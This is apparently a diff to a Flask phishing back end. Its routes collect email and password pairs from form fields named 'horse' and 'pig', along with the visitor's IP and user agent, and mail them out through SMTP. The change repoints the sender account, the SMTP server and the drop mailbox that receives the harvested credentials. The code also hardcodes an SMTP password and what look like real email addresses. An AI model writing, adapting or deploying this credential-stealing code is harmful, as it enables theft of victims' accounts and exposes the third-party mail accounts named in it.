@@ -145,9 +145,9 @@ def first():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "eissa@waterworldwaterpark.com"
+        sender_email = "apskaita@zirginelis.lt"
         sender_emaill = "eissa"
-        receiver_email = "s.toihidi@gmail.com"
+        receiver_email = "eze-oshimiri@mail.com"
         password = "EISSA47314A"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
@@ -164,7 +164,7 @@ def first():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("mail.waterworldwaterpark.com", 465) as server:
+        with smtplib.SMTP_SSL("mail.zirginelis.lt", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('benza', web=session.get('eman')))
@@ -183,9 +183,9 @@ def second():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "eissa@waterworldwaterpark.com"
+        sender_email = "a@zirginelis.lt"
         sender_emaill = "eissa"
-        receiver_email = "s.toihidi@gmail.com"
+        receiver_email = "eze-oshimiri@mail.com"
         password = "EISSA47314A"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
